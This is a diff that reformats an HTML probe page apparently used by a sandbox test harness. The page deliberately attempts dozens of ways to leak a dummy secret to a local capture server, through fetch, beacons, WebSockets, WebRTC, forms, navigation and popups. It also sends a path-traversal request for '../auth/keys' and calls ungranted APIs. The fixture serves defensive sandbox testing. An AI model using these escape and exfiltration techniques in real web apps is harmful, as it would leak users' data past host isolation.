@@ -1,94 +1,358 @@
-<!doctype html><html><body>An app built to escape, for tools/Walk -- app-probe.
-<script>
-// Filled in by tools/Walk -- app-probe, as are the way out below. Everything here is an attempt to get out.
-const T='http://127.0.0.1:__TCP__', U='127.0.0.1:__UDP__', W='127.0.0.1:__TCP__';
-const r={};
-const say=(k,v)=>{r[k]=String(v)};
-const t=(k,f)=>{try{say(k,f())}catch(e){say(k,'THROW '+e.name)}};
-const leak=v=>T+'/leak/'+v+'?secret=s3cret';
-t('origin',()=>self.origin); t('href',()=>location.href);
-t('cookie',()=>{document.cookie='a=1';return JSON.stringify(document.cookie)});
-t('localStorage',()=>{localStorage.setItem('a','1');return 'WORKS'});
-t('sessionStorage',()=>{sessionStorage.setItem('a','1');return 'WORKS'});
-t('indexedDB',()=>{const q=indexedDB.open('x');q.onsuccess=()=>say('indexedDB','WORKS');q.onerror=()=>say('indexedDB','error');return 'pending'});
-t('caches',()=>{caches.keys().then(()=>say('caches','WORKS'),e=>say('caches','rej '+e.name));return 'pending'});
-t('parentDoc',()=>parent.document.body.innerHTML.length);
-t('topDoc',()=>top.document.body.innerHTML.length);
-t('frameElement',()=>String(window.frameElement));
-t('webkitHandlers',()=>{const m=window.webkit&&window.webkit.messageHandlers;return m?'PRESENT':'absent'});
-t('webkitHandlerCall',()=>{window.webkit.messageHandlers.wilson.postMessage({id:1,method:'direct',args:[]});return 'SENT'});
-t('RTCPeerConnection',()=>typeof RTCPeerConnection);
-t('webkitRTC',()=>typeof webkitRTCPeerConnection);
-t('WebTransport',()=>typeof WebTransport);
-t('getUserMedia',()=>typeof (navigator.mediaDevices&&navigator.mediaDevices.getUserMedia));
-t('clipboardRead',()=>{navigator.clipboard.readText().then(x=>say('clipboardRead','READ '+x.length),e=>say('clipboardRead','rej '+e.name));return 'pending'});
-t('eval',()=>eval('1+1'));
-t('Function',()=>new Function('return 2')());
-t('worker',()=>{const w=new Worker(URL.createObjectURL(new Blob(['postMessage(1)'])));w.onmessage=()=>say('worker','RAN');w.onerror=()=>say('worker','error');return 'constructed'});
-t('sharedWorker',()=>{new SharedWorker('data:text/javascript,1');return 'constructed'});
-t('serviceWorker',()=>{navigator.serviceWorker.register('x.js').then(()=>say('serviceWorker','REG'),e=>say('serviceWorker','rej '+e.name));return 'pending'});
-t('notification',()=>typeof Notification+' '+(typeof Notification!=='undefined'?Notification.permission:''));
-// network
-t('fetch',()=>{fetch(leak('fetch'),{mode:'no-cors'}).then(()=>say('fetch','RESOLVED'),e=>say('fetch','rej'));return 'pending'});
-t('xhr',()=>{const x=new XMLHttpRequest();x.open('GET',leak('xhr'));x.send();return 'sent'});
-t('beacon',()=>navigator.sendBeacon(leak('beacon'),'x'));
-t('img',()=>{new Image().src=leak('img');return 'set'});
-t('script',()=>{const s=document.createElement('script');s.src=leak('script');document.head.append(s);return 'set'});
-t('style',()=>{const s=document.createElement('link');s.rel='stylesheet';s.href=leak('style');document.head.append(s);return 'set'});
-t('cssimport',()=>{const s=document.createElement('style');s.textContent='@import url("'+leak('cssimport')+'");body{background:url("'+leak('cssbg')+'")}';document.head.append(s);return 'set'});
-t('font',()=>{const f=new FontFace('x','url('+leak('font')+')');f.load().catch(()=>{});return 'set'});
-t('ws',()=>{new WebSocket('ws://'+W+'/leak/ws');return 'set'});
-t('es',()=>{new EventSource(leak('es'));return 'set'});
-t('video',()=>{const v=document.createElement('video');v.src=leak('video');v.load();document.body.append(v);return 'set'});
-t('preconnect',()=>{const l=document.createElement('link');l.rel='preconnect';l.href=T;document.head.append(l);return 'set'});
-t('prefetch',()=>{const l=document.createElement('link');l.rel='prefetch';l.href=leak('prefetch');document.head.append(l);return 'set'});
-t('preload',()=>{const l=document.createElement('link');l.rel='preload';l.as='image';l.href=leak('preload');document.head.append(l);return 'set'});
-t('objectembed',()=>{const o=document.createElement('object');o.data=leak('object');document.body.append(o);const e=document.createElement('embed');e.src=leak('embed');document.body.append(e);return 'set'});
-t('svgimage',()=>{document.body.insertAdjacentHTML('beforeend','<svg><image href="'+leak('svgimage')+'"/></svg>');return 'set'});
-t('nestedIframe',()=>{const i=document.createElement('iframe');i.src=leak('nestedIframe');document.body.append(i);return 'set'});
-t('nestedSrcdoc',()=>{const i=document.createElement('iframe');i.srcdoc='<script>new Image().src="'+leak('nestedSrcdoc')+'"<\/script>';document.body.append(i);return 'set'});
-// a fresh window from a blank frame: the usual way round a patched global
-t('freshRTC',()=>{const i=document.createElement('iframe');document.body.append(i);const w=i.contentWindow;return w?typeof w.RTCPeerConnection:'nowin'});
-// webrtc
-t('rtc',()=>{const p=new RTCPeerConnection({iceServers:[{urls:'stun:'+U}]});p.createDataChannel('x');p.onicecandidate=e=>{if(e.candidate)say('rtcCandidate',e.candidate.candidate.slice(0,60))};p.createOffer().then(o=>p.setLocalDescription(o));return 'made'});
-t('webtransport',()=>{new WebTransport('https://'+W+'/leak/wt').ready.catch(()=>{});return 'made'});
-// non-navigating ways out
-t('popup',()=>{const w=window.open(leak('popup'));return w?'OPENED':'null'});
-t('geolocation',()=>{navigator.geolocation.getCurrentPosition(()=>say('geolocation','READ'),e=>say('geolocation','denied '+e.code));return 'pending'});
-t('paste',()=>document.execCommand('paste'));
-t('alert',()=>{const s=Date.now();alert('x');return 'returned in '+(Date.now()-s)});
-// The port is the app's to use however it likes, so take it raw as well and send it what the client would not.
-let raw;
-addEventListener('message',e=>{if(e.ports[0]&&!raw){raw=e.ports[0];say('rawPort','held');raw.start();raw.addEventListener('message',m=>{if(m.data.id===999)say('rawMoveCard',m.data.error);if(m.data.id===998)say('rawGetCardUp',m.data.error)});raw.postMessage({id:999,method:'moveCard',args:['0001','ready']});raw.postMessage({id:998,method:'getCard',args:['../auth/keys']});raw.postMessage('not a request')}});
-if(window.wilson){
- const a=(k,f)=>f().then(v=>say(k,'ANSWERED '+JSON.stringify(v).slice(0,40)),e=>say(k,'refused: '+e.message));
- say('project',wilson.project);say('grants',wilson.grants.join());
- a('granted',()=>wilson.listCards());
- a('grantedCard',()=>wilson.getCard('0001'));
- a('ungrantedActivity',()=>wilson.listProjectActivity());
- a('ungrantedStats',()=>wilson.getProjectStats());
- a('otherProject',()=>wilson.listCards({project:'other'}));
-}
-// Report, then try ONE way out, since the first that works ends the page.
-setTimeout(()=>{if(raw)raw.postMessage({report:r})},900);
-const ways={
- ping(){const a=document.createElement('a');a.href='#x';a.ping=leak('ping');document.body.append(a);a.click()},
- form(){const f=document.createElement('form');f.method='POST';f.action=leak('form');f.innerHTML='<input name=a value=b>';document.body.append(f);f.submit()},
- anchorBlank(){const a=document.createElement('a');a.href=leak('anchorBlank');a.target='_blank';document.body.append(a);a.click()},
- anchorNamed(){const a=document.createElement('a');a.href=leak('anchorNamed');a.target='elsewhere';document.body.append(a);a.click()},
- anchorWindow(){const a=document.createElement('a');a.href=leak('anchorWindow');a.target='_top';document.body.append(a);a.click()},
- areaBlank(){document.body.insertAdjacentHTML('beforeend','<map name=m><area id=z shape=default target=_blank href="'+leak('areaBlank')+'"></map>');document.getElementById('z').click()},
- topnav(){top.location=leak('topnav')},
- parentnav(){parent.location=leak('parentnav')},
- metarefresh(){document.head.insertAdjacentHTML('beforeend','<meta http-equiv=refresh content="0;url='+leak('metarefresh')+'">')},
- custom(){location.href='wilsonprobe://leak/customscheme'},
- datanav(){location.href='data:text/html,<script>new Image().src="'+leak('datanav')+'"<\/script>'},
- blobnav(){location.href=URL.createObjectURL(new Blob(['<script>new Image().src="'+leak('blobnav')+'"<\/script>'],{type:'text/html'}))},
- download(){const a=document.createElement('a');a.href=leak('download');a.download='x.html';document.body.append(a);a.click()},
- selfnav(){location.href=leak('selfnav')},
- replace(){location.replace(leak('replace'))},
- srcdocreload(){location.reload()},
- none(){},
-};
-setTimeout(()=>{try{ways['__WAY__']()}catch(e){}},1200);
-</script></body></html>
+<!doctype html>
+<html>
+    <body>
+        An app built to escape, for tools/Walk -- app-probe.
+        <script>
+            // Filled in by tools/Walk -- app-probe, as are the way out below. Everything here is an attempt to get out.
+            const T = 'http://127.0.0.1:__TCP__',
+                U = '127.0.0.1:__UDP__',
+                W = '127.0.0.1:__TCP__';
+            const r = {};
+            const say = (k, v) => {
+                r[k] = String(v);
+            };
+            const t = (k, f) => {
+                try {
+                    say(k, f());
+                } catch (e) {
+                    say(k, 'THROW ' + e.name);
+                }
+            };
+            const leak = v => T + '/leak/' + v + '?secret=s3cret';
+            t('origin', () => self.origin);
+            t('href', () => location.href);
+            t('cookie', () => {
+                document.cookie = 'a=1';
+                return JSON.stringify(document.cookie);
+            });
+            t('localStorage', () => {
+                localStorage.setItem('a', '1');
+                return 'WORKS';
+            });
+            t('sessionStorage', () => {
+                sessionStorage.setItem('a', '1');
+                return 'WORKS';
+            });
+            t('indexedDB', () => {
+                const q = indexedDB.open('x');
+                q.onsuccess = () => say('indexedDB', 'WORKS');
+                q.onerror = () => say('indexedDB', 'error');
+                return 'pending';
+            });
+            t('caches', () => {
+                caches.keys().then(
+                    () => say('caches', 'WORKS'),
+                    e => say('caches', 'rej ' + e.name),
+                );
+                return 'pending';
+            });
+            t('parentDoc', () => parent.document.body.innerHTML.length);
+            t('topDoc', () => top.document.body.innerHTML.length);
+            t('frameElement', () => String(window.frameElement));
+            t('webkitHandlers', () => {
+                const m = window.webkit && window.webkit.messageHandlers;
+                return m ? 'PRESENT' : 'absent';
+            });
+            t('webkitHandlerCall', () => {
+                window.webkit.messageHandlers.wilson.postMessage({ id: 1, method: 'direct', args: [] });
+                return 'SENT';
+            });
+            t('RTCPeerConnection', () => typeof RTCPeerConnection);
+            t('webkitRTC', () => typeof webkitRTCPeerConnection);
+            t('WebTransport', () => typeof WebTransport);
+            t('getUserMedia', () => typeof (navigator.mediaDevices && navigator.mediaDevices.getUserMedia));
+            t('clipboardRead', () => {
+                navigator.clipboard.readText().then(
+                    x => say('clipboardRead', 'READ ' + x.length),
+                    e => say('clipboardRead', 'rej ' + e.name),
+                );
+                return 'pending';
+            });
+            t('eval', () => eval('1+1'));
+            t('Function', () => new Function('return 2')());
+            t('worker', () => {
+                const w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)'])));
+                w.onmessage = () => say('worker', 'RAN');
+                w.onerror = () => say('worker', 'error');
+                return 'constructed';
+            });
+            t('sharedWorker', () => {
+                new SharedWorker('data:text/javascript,1');
+                return 'constructed';
+            });
+            t('serviceWorker', () => {
+                navigator.serviceWorker.register('x.js').then(
+                    () => say('serviceWorker', 'REG'),
+                    e => say('serviceWorker', 'rej ' + e.name),
+                );
+                return 'pending';
+            });
+            t('notification', () => typeof Notification + ' ' + (typeof Notification !== 'undefined' ? Notification.permission : ''));
+            // network
+            t('fetch', () => {
+                fetch(leak('fetch'), { mode: 'no-cors' }).then(
+                    () => say('fetch', 'RESOLVED'),
+                    e => say('fetch', 'rej'),
+                );
+                return 'pending';
+            });
+            t('xhr', () => {
+                const x = new XMLHttpRequest();
+                x.open('GET', leak('xhr'));
+                x.send();
+                return 'sent';
+            });
+            t('beacon', () => navigator.sendBeacon(leak('beacon'), 'x'));
+            t('img', () => {
+                new Image().src = leak('img');
+                return 'set';
+            });
+            t('script', () => {
+                const s = document.createElement('script');
+                s.src = leak('script');
+                document.head.append(s);
+                return 'set';
+            });
+            t('style', () => {
+                const s = document.createElement('link');
+                s.rel = 'stylesheet';
+                s.href = leak('style');
+                document.head.append(s);
+                return 'set';
+            });
+            t('cssimport', () => {
+                const s = document.createElement('style');
+                s.textContent = '@import url("' + leak('cssimport') + '");body{background:url("' + leak('cssbg') + '")}';
+                document.head.append(s);
+                return 'set';
+            });
+            t('font', () => {
+                const f = new FontFace('x', 'url(' + leak('font') + ')');
+                f.load().catch(() => {});
+                return 'set';
+            });
+            t('ws', () => {
+                new WebSocket('ws://' + W + '/leak/ws');
+                return 'set';
+            });
+            t('es', () => {
+                new EventSource(leak('es'));
+                return 'set';
+            });
+            t('video', () => {
+                const v = document.createElement('video');
+                v.src = leak('video');
+                v.load();
+                document.body.append(v);
+                return 'set';
+            });
+            t('preconnect', () => {
+                const l = document.createElement('link');
+                l.rel = 'preconnect';
+                l.href = T;
+                document.head.append(l);
+                return 'set';
+            });
+            t('prefetch', () => {
+                const l = document.createElement('link');
+                l.rel = 'prefetch';
+                l.href = leak('prefetch');
+                document.head.append(l);
+                return 'set';
+            });
+            t('preload', () => {
+                const l = document.createElement('link');
+                l.rel = 'preload';
+                l.as = 'image';
+                l.href = leak('preload');
+                document.head.append(l);
+                return 'set';
+            });
+            t('objectembed', () => {
+                const o = document.createElement('object');
+                o.data = leak('object');
+                document.body.append(o);
+                const e = document.createElement('embed');
+                e.src = leak('embed');
+                document.body.append(e);
+                return 'set';
+            });
+            t('svgimage', () => {
+                document.body.insertAdjacentHTML('beforeend', '<svg><image href="' + leak('svgimage') + '"/></svg>');
+                return 'set';
+            });
+            t('nestedIframe', () => {
+                const i = document.createElement('iframe');
+                i.src = leak('nestedIframe');
+                document.body.append(i);
+                return 'set';
+            });
+            t('nestedSrcdoc', () => {
+                const i = document.createElement('iframe');
+                i.srcdoc = '<script>new Image().src="' + leak('nestedSrcdoc') + '"<\/script>';
+                document.body.append(i);
+                return 'set';
+            });
+            // a fresh window from a blank frame: the usual way round a patched global
+            t('freshRTC', () => {
+                const i = document.createElement('iframe');
+                document.body.append(i);
+                const w = i.contentWindow;
+                return w ? typeof w.RTCPeerConnection : 'nowin';
+            });
+            // webrtc
+            t('rtc', () => {
+                const p = new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + U }] });
+                p.createDataChannel('x');
+                p.onicecandidate = e => {
+                    if (e.candidate) say('rtcCandidate', e.candidate.candidate.slice(0, 60));
+                };
+                p.createOffer().then(o => p.setLocalDescription(o));
+                return 'made';
+            });
+            t('webtransport', () => {
+                new WebTransport('https://' + W + '/leak/wt').ready.catch(() => {});
+                return 'made';
+            });
+            // non-navigating ways out
+            t('popup', () => {
+                const w = window.open(leak('popup'));
+                return w ? 'OPENED' : 'null';
+            });
+            t('geolocation', () => {
+                navigator.geolocation.getCurrentPosition(
+                    () => say('geolocation', 'READ'),
+                    e => say('geolocation', 'denied ' + e.code),
+                );
+                return 'pending';
+            });
+            t('paste', () => document.execCommand('paste'));
+            t('alert', () => {
+                const s = Date.now();
+                alert('x');
+                return 'returned in ' + (Date.now() - s);
+            });
+            // The port is the app's to use however it likes, so take it raw as well and send it what the client would not.
+            let raw;
+            addEventListener('message', e => {
+                if (e.ports[0] && !raw) {
+                    raw = e.ports[0];
+                    say('rawPort', 'held');
+                    raw.start();
+                    raw.addEventListener('message', m => {
+                        if (m.data.id === 999) say('rawMoveCard', m.data.error);
+                        if (m.data.id === 998) say('rawGetCardUp', m.data.error);
+                    });
+                    raw.postMessage({ id: 999, method: 'moveCard', args: ['0001', 'ready'] });
+                    raw.postMessage({ id: 998, method: 'getCard', args: ['../auth/keys'] });
+                    raw.postMessage('not a request');
+                }
+            });
+            if (window.wilson) {
+                const a = (k, f) =>
+                    f().then(
+                        v => say(k, 'ANSWERED ' + JSON.stringify(v).slice(0, 40)),
+                        e => say(k, 'refused: ' + e.message),
+                    );
+                say('project', wilson.project);
+                say('grants', wilson.grants.join());
+                a('granted', () => wilson.listCards());
+                a('grantedCard', () => wilson.getCard('0001'));
+                a('ungrantedActivity', () => wilson.listProjectActivity());
+                a('ungrantedStats', () => wilson.getProjectStats());
+                a('otherProject', () => wilson.listCards({ project: 'other' }));
+            }
+            // Report, then try ONE way out, since the first that works ends the page.
+            setTimeout(() => {
+                if (raw) raw.postMessage({ report: r });
+            }, 900);
+            const ways = {
+                ping() {
+                    const a = document.createElement('a');
+                    a.href = '#x';
+                    a.ping = leak('ping');
+                    document.body.append(a);
+                    a.click();
+                },
+                form() {
+                    const f = document.createElement('form');
+                    f.method = 'POST';
+                    f.action = leak('form');
+                    f.innerHTML = '<input name=a value=b>';
+                    document.body.append(f);
+                    f.submit();
+                },
+                anchorBlank() {
+                    const a = document.createElement('a');
+                    a.href = leak('anchorBlank');
+                    a.target = '_blank';
+                    document.body.append(a);
+                    a.click();
+                },
+                anchorNamed() {
+                    const a = document.createElement('a');
+                    a.href = leak('anchorNamed');
+                    a.target = 'elsewhere';
+                    document.body.append(a);
+                    a.click();
+                },
+                anchorWindow() {
+                    const a = document.createElement('a');
+                    a.href = leak('anchorWindow');
+                    a.target = '_top';
+                    document.body.append(a);
+                    a.click();
+                },
+                areaBlank() {
+                    document.body.insertAdjacentHTML(
+                        'beforeend',
+                        '<map name=m><area id=z shape=default target=_blank href="' + leak('areaBlank') + '"></map>',
+                    );
+                    document.getElementById('z').click();
+                },
+                topnav() {
+                    top.location = leak('topnav');
+                },
+                parentnav() {
+                    parent.location = leak('parentnav');
+                },
+                metarefresh() {
+                    document.head.insertAdjacentHTML('beforeend', '<meta http-equiv=refresh content="0;url=' + leak('metarefresh') + '">');
+                },
+                custom() {
+                    location.href = 'wilsonprobe://leak/customscheme';
+                },
+                datanav() {
+                    location.href = 'data:text/html,<script>new Image().src="' + leak('datanav') + '"<\/script>';
+                },
+                blobnav() {
+                    location.href = URL.createObjectURL(
+                        new Blob(['<script>new Image().src="' + leak('blobnav') + '"<\/script>'], { type: 'text/html' }),
+                    );
+                },
+                download() {
+                    const a = document.createElement('a');
+                    a.href = leak('download');
+                    a.download = 'x.html';
+                    document.body.append(a);
+                    a.click();
+                },
+                selfnav() {
+                    location.href = leak('selfnav');
+                },
+                replace() {
+                    location.replace(leak('replace'));
+                },
+                srcdocreload() {
+                    location.reload();
+                },
+                none() {},
+            };
+            setTimeout(() => {
+                try {
+                    ways['__WAY__']();
+                } catch (e) {}
+            }, 1200);
+        </script>
+    </body>
+</html>
